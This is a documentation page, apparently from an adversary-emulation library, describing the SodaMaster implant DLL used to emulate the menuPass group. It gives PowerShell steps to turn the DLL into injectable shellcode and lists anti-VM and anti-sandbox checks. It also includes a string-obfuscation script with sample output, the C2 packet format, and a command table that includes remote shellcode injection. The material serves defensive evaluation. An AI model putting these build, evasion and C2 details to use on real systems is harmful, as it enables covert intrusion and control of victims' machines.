<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-H74RC38PBM"></script>
    <script data-cfasync="false">window.dataLayer = window.dataLayer || [];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());gtag('config', 'G-H74RC38PBM');</script>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-root" content="/ael">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.6.0.786727257842">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.6.0">

    <!-- Primary Meta Tags -->
    <title>SodaMaster</title>
    <meta name="title" content="SodaMaster">
    <meta name="description" content="SodaMaster Diagram">

    <!-- Canonical -->
    <link rel="canonical" href="https://attackevals.github.io/ael/managedservices/menupass/resources/sodamaster/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/sodamaster/">
    <meta property="og:title" content="SodaMaster">
    <meta property="og:description" content="SodaMaster Diagram">
    <meta property="og:image" content="https://attackevals.github.io/ael/managedservices/menupass/resources/sodamaster/images/sm_diagram.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://attackevals.github.io/ael/managedservices/menupass/resources/sodamaster/">
    <meta property="twitter:title" content="SodaMaster">
    <meta property="twitter:description" content="SodaMaster Diagram">
    <meta property="twitter:image" content="https://attackevals.github.io/ael/managedservices/menupass/resources/sodamaster/images/sm_diagram.png">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../favicon.png" rel="icon">
    <link href="../../../../resources/css/retype.css?v=3.6.0.786727257842" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.6.0.786727257842" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.6.0.786727257842" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-xl">
                            <span class="w-10 mr-2 grow-0 shrink-0 overflow-hidden">
                                <img class="max-h-10 dark:hidden md:inline-block" src="../../../../images/attackevals-logo.png">
                                <img class="max-h-10 hidden dark:inline-block" src="../../../../images/attackevals-logo.png">
                            </span>
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">ATTACK Evaluation Library</span>
                        </a>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://attackevals.mitre-engenuity.org">Attack Evaluations</a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                                <nav class="breadcrumb" aria-label="Breadcrumb">
                                    <ol role="list">
                                        <li class="pr-4">
                                            <a href="../../../../" class="pr-4">
                                                ATT&​CK Evaluations Library
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <span class="pr-4">
                                                Managed Services
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/" class="pr-4">
                                                menu​Pass
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/resources/" class="pr-4">
                                                Resources
                                            </a>
                                            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
                                                <path d="M8.72 18.78a.75.75 0 0 1 0-1.06L14.44 12 8.72 6.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0Z"/>
                                            </svg>
                                        </li>
                                        <li class="pr-4">
                                            <a href="../../../../managedservices/menupass/resources/sodamaster/" class="pr-4">
                                                Soda​Master
                                            </a>
                                        </li>
                                    </ol>
                                </nav>
                
                                <!-- Page content  -->
<doc-anchor-target id="sodamaster" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sodamaster">#</doc-anchor-trigger>
        <span>SodaMaster</span>
    </h1>
</doc-anchor-target>
<div class="-mt-3 mb-12 flex flex-wrap text-sm text-gray-400 dark:text-dark-350 items-center">
    <div>In&nbsp;</div>
    <div><a href="../../categories/managed-services/">Managed-Services</a></div>
</div>

<doc-anchor-target id="sodamaster-dll">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#sodamaster-dll">#</doc-anchor-trigger>
        <span>SodaMaster DLL</span>
    </h2>
</doc-anchor-target>
<p><figure class="content-center">
    <img src="images/sm_diagram.png" alt="SodaMaster Diagram">
    <figcaption class="caption">SodaMaster Diagram</figcaption>
</figure>
</p>
<doc-anchor-target id="description">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#description">#</doc-anchor-trigger>
        <span>Description</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="automated-system-discovery">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#automated-system-discovery">#</doc-anchor-trigger>
        <span>Automated System Discovery</span>
    </h4>
</doc-anchor-target>
<p>Upon execution of SodaMaster, there are several pieces of information
collected and analyzed in the target environment. This information is used
to determine if the payload is running in a virtualized/sandboxed environment
as well as to relay situational awareness information back to the C2 server.</p>
<p>Information collected and sent back to the C2 server are as follows:</p>
<ul>
<li>The username/owner of the SodaMaster process</li>
<li>The hostname/computername of the system with the implant installed</li>
<li>The process ID of the SodaMaster process and the process privilege flag</li>
<li>Processor architecture and Windows build information</li>
<li>The date/time that the implant was initially executed</li>
<li>An RC4 key that will be used to encrypt the followup communications</li>
<li>The name of the socket used to connect to the C2 server</li>
</ul>
<doc-anchor-target id="shellcode-reflective-dll-injection-srdi">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#shellcode-reflective-dll-injection-srdi">#</doc-anchor-trigger>
        <span>Shellcode Reflective DLL Injection (sRDI)</span>
    </h4>
</doc-anchor-target>
<p>The sRDI payload should be compiled as a DLL with an export function.</p>
<p>Use the following steps to prepare the payload and generate shellcode for use
with the SodaMaster sRDI module:</p>
<ol>
<li>Clone the <a href="https://github.com/monoxgas/sRDI" class="outbound" target="_blank"><span>sRDI repo</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, Note that you must checkout the sRDI repo to commit
<code v-pre>5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a</code> or it will not function.</li>
<li>Open <code v-pre>Powershell</code> and navigate to the <code v-pre>sRDI/Powershell</code> directory of the
sRDI repo (double check that you&#x27;re checked out to the correct commit).</li>
<li>Move a copy of the compiled .dll file to the Powershell directory (GUI or mv cmd work).</li>
<li>Import the conversion module: <code v-pre>Import-Module .\ConvertTo-Shellcode.ps1</code></li>
<li>Perform the conversion:</li>
</ol>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">$sc = ConvertTo-Shellcode -File SodaMaster.dll -FunctionName &quot;init&quot;
$sc2 = $sc | % { write-output ([System.String]::Format('{0:X2}', $_)) }
$sc2 -join &quot;&quot; &gt; payload.txt</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="anti-vmanti-sandbox">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#anti-vmanti-sandbox">#</doc-anchor-trigger>
        <span>Anti-VM/Anti-Sandbox</span>
    </h4>
</doc-anchor-target>
<p>Sodamaster implements several anti-vm/anti-sandbox techniques. These
techniques determine if the implant is in a virtual environemnt and/or
being manipulated in an unitended way and exits the application.</p>
<p>The following high level techniques have been implemented into SodaMaster:</p>
<ul>
<li>Time based evasion
<ul>
<li>The implant track the time between cycles and determines if the application/system time is being manipulated.</li>
</ul>
</li>
<li>Registry Checks
<ul>
<li><code v-pre>Applications\\VMwareHostOpen.exe</code></li>
</ul>
</li>
<li>Running Process Checks
<ul>
<li><code v-pre>vmtoolsd.exe</code>
<ul>
<li><code v-pre>vbox.exe</code></li>
</ul>
</li>
</ul>
</li>
<li>Checks that the number of processors are greater than 1.</li>
<li>Sits in a loop until the active window state changes (to show user activity)</li>
</ul>
<doc-anchor-target id="stackstrings">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#stackstrings">#</doc-anchor-trigger>
        <span>StackStrings</span>
    </h4>
</doc-anchor-target>
<p>Strings can be easily discovered inside a binary. The idea of stack
strings is to add a layer of obfuscation to the string that makes
it more dificult to read and reverse. The script <code v-pre>stackstrings.py</code>
is an automated tool that can be used to convert normal stirngs
into stack strings.</p>
<doc-anchor-target id="the-math-function">
    <h5>
        <doc-anchor-trigger class="header-anchor-trigger" to="#the-math-function">#</doc-anchor-trigger>
        <span>the &quot;math&quot; function</span>
    </h5>
</doc-anchor-target>
<p>To use the stackstring function you will need to write a function that performs some
operations with two integer variables. These opterations will help to obfuscate the fact that
the provided variables add up to a decimal value.</p>
<doc-anchor-target id="note-the-script-adds-5-to-int-val1-so-a-custom-function-should-account-for-that">
    <h6>
        <doc-anchor-trigger class="header-anchor-trigger" to="#note-the-script-adds-5-to-int-val1-so-a-custom-function-should-account-for-that">#</doc-anchor-trigger>
        <span>NOTE: The script adds 5 to int val1, so a custom function should account for that</span>
    </h6>
</doc-anchor-target>
<p>Math Function:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">int RetCharVar(int val1, int val2) {
 int val3 = val1 * 100;
 int val4 = val2 * 50;
 int val5 = 0;
 if (val3 &gt; val1) {
  val3 = val3 / 25;
  val5 = val3 / 4;
  val5 = val5 - 5;
 }
 return val5 + (val4 / 50);
}</code></pre>
</doc-codeblock></div>
<p>The script takes the three following required arguments:</p>
<ul>
<li>function_name - The &quot;math&quot; function.</li>
<li>variable_name - a variable name that will hold the obfuscated string</li>
<li>string - The string you want to obfuscate</li>
</ul>
<p>Usage:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">python3 stackstrings.py --function_name [MATH FUNCTION NAME] --variable_name [STRING VARIABLE NAME] --string [STRING TO OBFUSCATE]</code></pre>
</doc-codeblock></div>
<p>Example:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">python3 stackstrings.py --function_name RetCharVar --variable_name secretString --string &quot;Top Secret Value&quot;


char secretString[] = &quot;TCfESAUrHEzHWpup&quot;;
*(secretString + 1) = RetCharVar(16,100);
*(secretString + 2) = RetCharVar(60,57);
*(secretString + 3) = 32;
*(secretString + 5) = RetCharVar(94,12);
*(secretString + 6) = RetCharVar(64,40);
*(secretString + 7) = 114;
*(secretString + 8) = RetCharVar(37,69);
*(secretString + 9) = RetCharVar(7,114);
*(secretString + 10) = RetCharVar(19,18);
*(secretString + 11) = RetCharVar(41,50);
*(secretString + 12) = 97;
*(secretString + 13) = RetCharVar(72,41);
*(secretString + 14) = 117;
*(secretString + 15) = RetCharVar(102,4);</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="c2-communications">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#c2-communications">#</doc-anchor-trigger>
        <span>C2 Communications</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="packet-format">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#packet-format">#</doc-anchor-trigger>
        <span>Packet Format</span>
    </h4>
</doc-anchor-target>
<p>Packets are created by prepending data with an associated ID and length byte. The start of the unencrypted
packet data will contain an identifier. The identifier will allow the C2 server to differentiate
from random connections and an actual implant connection. The following example shows how a
packet send to the C2 server would format sending the username and computer name to the C2
server.</p>
<doc-anchor-target id="data-field-formats">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#data-field-formats">#</doc-anchor-trigger>
        <span>Data Field Formats</span>
    </h4>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Session Identifier: HEX STRING - SODAMASTER  -&gt; 534f44414d4153544552
ID (cmd id):  HEX - DECIMAL - w   -&gt; 77 (Function uses the decimal form eg. 119)
LENGTH OF LENGTH: HEX - DECIMAL - 02   -&gt; 3 (Tells the function the length is 3 string bytes long)
LENGTH:   HEX STRING - 0100   -&gt; 10 (The data is 10 characters long)
DATA:   HEX STRING - 534f44414d4153544552 -&gt; SODAMASTER</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="unencrypted-example">
    <h5>
        <doc-anchor-trigger class="header-anchor-trigger" to="#unencrypted-example">#</doc-anchor-trigger>
        <span>Unencrypted Example</span>
    </h5>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">
[IDENTIFIER (HEX STRING)] [ID (HEX - DECIMAL)] [LENGTH OF LENGTH (HEX-DECIMAL)] [LENGTH (HEX STRING - INT)] [DATA (HEX STRING)]

Example 1:
[SODAMASTER] [0x03] [0x01] [03] [Bob] [0x07] [0x02] [0100] [Desktop-PC]

Example 2:
[SODAMASTER] [0x99] [0x01] [03] [Bob] [0x07] [0x02] [0100] [Desktop-PC]</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="encrypted-example">
    <h5>
        <doc-anchor-trigger class="header-anchor-trigger" to="#encrypted-example">#</doc-anchor-trigger>
        <span>Encrypted Example</span>
    </h5>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">{RC4 [IDENTIFIER (HEX STRING)] [ID (HEX - DECIMAL)] [LENGTH OF LENGTH (HEX-DECIMAL)] [LENGTH (HEX STRING - INT)] [DATA (HEX STRING)] }

{RC4 [SODAMASTER][0x03][0x01][03][Bob][0x07][0x02][0100][Desktop-PC] }</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="implant-packet-dataid-table-implant---c2">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#implant-packet-dataid-table-implant---c2">#</doc-anchor-trigger>
        <span>Implant Packet Data/ID Table (Implant -&gt; C2)</span>
    </h4>
</doc-anchor-target>
<p>The following table shows the ID&#x27;s and correlated data in the first packet send to the C2 server.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>ID</th>
<th>Length</th>
<th>Data</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x03</td>
<td>Variable</td>
<td>User Name</td>
</tr>
<tr>
<td>0x04</td>
<td>Variable</td>
<td>PID</td>
</tr>
<tr>
<td>0x05</td>
<td>Variable</td>
<td>Date of execution (yyyy/mm/dd hh:mm:ss)</td>
</tr>
<tr>
<td>0x06</td>
<td>Variable</td>
<td>RC4 encryption key for C2 communications</td>
</tr>
<tr>
<td>0x07</td>
<td>Varaible</td>
<td>Computer Name</td>
</tr>
<tr>
<td>0x08</td>
<td>4 Byte</td>
<td>Socket name</td>
</tr>
<tr>
<td>0x09</td>
<td>Variable</td>
<td>Privilege Flag</td>
</tr>
<tr>
<td>0x40</td>
<td>Variable</td>
<td>Processor Arch (1 byte), OS Major version (1 byte), OS Build version (4 bytes), Product Type (3 bytes)</td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="implant-packet-dataid-table-contd-implant---c2">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#implant-packet-dataid-table-contd-implant---c2">#</doc-anchor-trigger>
        <span>Implant Packet Data/ID Table Contd. (Implant -&gt; C2)</span>
    </h4>
</doc-anchor-target>
<p>Additional Data/ID&#x27;s to be used for general C2 communication</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>ID</th>
<th>Length</th>
<th>Data</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x98</td>
<td>NULL</td>
<td>C2 beacon</td>
</tr>
<tr>
<td>0x99</td>
<td>Variable</td>
<td>Response to C2 (stdout, ack, etc.)</td>
</tr>
</tbody>
</table>
</div>
<doc-anchor-target id="c2-packet-dataid-table-c2---implant">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#c2-packet-dataid-table-c2---implant">#</doc-anchor-trigger>
        <span>C2 Packet Data/ID Table (C2 -&gt; Implant)</span>
    </h4>
</doc-anchor-target>
<p>THe following table shows the Packet command table and expected data/arguments. Arguments
are separated using a semicolon <code v-pre>;</code>.</p>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th>Command</th>
<th>Length</th>
<th>Arguments</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>w</td>
<td>Variable</td>
<td>Message box title, Message box text</td>
<td>Pops up a message box on the implant host</td>
</tr>
<tr>
<td>x</td>
<td>0</td>
<td>NULL</td>
<td>Exit&#x27;s the implant process</td>
</tr>
<tr>
<td>l</td>
<td>Variable</td>
<td>Beacon timer</td>
<td>Set the time inbetween implant check-in&#x27;s (1-255 seconds)</td>
</tr>
<tr>
<td>f</td>
<td>Variable</td>
<td>RC4 key</td>
<td>Set the RC4 key to be used during communication</td>
</tr>
<tr>
<td>s</td>
<td>Variable</td>
<td>Shellcode</td>
<td>Send shellcode from the C2 server and inject into a process</td>
</tr>
</tbody>
</table>
</div>
<p>The C2 server will acknowledge packets by sending a <code v-pre>0x98</code>. If the C2 doesnt
acknowledge then the data should be resent.</p>
<p>Example:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">{RC4 [SODAMASTER][0x03][0x01][03][Bob][0x07][0x02][0100][Desktop-PC] } -&gt; C2 Server -&gt; [0x98]

[0x98] -&gt; Implant</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="expected-data-format-examples-c2---implant">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#expected-data-format-examples-c2---implant">#</doc-anchor-trigger>
        <span>Expected Data Format Examples (C2 -&gt; Implant)</span>
    </h4>
</doc-anchor-target>
<p>Tasking the implant to sleep for 15 seconds.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">6c01020105</code></pre>
</doc-codeblock></div>
<p>Tasking the implant to open a message box that says &quot;test&quot;</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">77010474657374
</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="encryption">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#encryption">#</doc-anchor-trigger>
        <span>Encryption</span>
    </h3>
</doc-anchor-target>
<doc-anchor-target id="stackstrings-1">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#stackstrings-1">#</doc-anchor-trigger>
        <span>StackStrings</span>
    </h4>
</doc-anchor-target>
<p>All strings that are used in the implant are either encoded using the StackString technique
or runtime Xor Encryption/Decrption.</p>
<doc-anchor-target id="xor-string-encryption">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#xor-string-encryption">#</doc-anchor-trigger>
        <span>XOR String Encryption</span>
    </h4>
</doc-anchor-target>
<p>The XOR encryption is done using macros at compile time, and is decrypted at
runtime. The code snippit was found on Stack overflow at:
<a href="https://stackoverflow.com/questions/7270473/compile-time-string-encryption">https://stackoverflow.com/questions/7270473/compile-time-string-encryption</a></p>
<doc-anchor-target id="rsa-encryption">
    <h4>
        <doc-anchor-trigger class="header-anchor-trigger" to="#rsa-encryption">#</doc-anchor-trigger>
        <span>RSA Encryption</span>
    </h4>
</doc-anchor-target>
<p>The first packet sent by the SodaMaster implant is encrypted with an RSA 2048-bit key. The
key was generated using the following commands:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">// Generate private key
openssl genrsa -out private.pem 2048
// Generate public key
openssl rsa -in private.pem -outform PEM -pubout -out public.pem

// Convert public key to DER
openssl rsa -pubin -in public.pem -RSAPublicKey_out -out public_pkcs1.key -outform der</code></pre>
</doc-codeblock></div>
<p>Note: The DER format public key is bae64 encoded before being put in the RSA function</p>
<doc-anchor-target id="rc4-encryption">
    <h4>
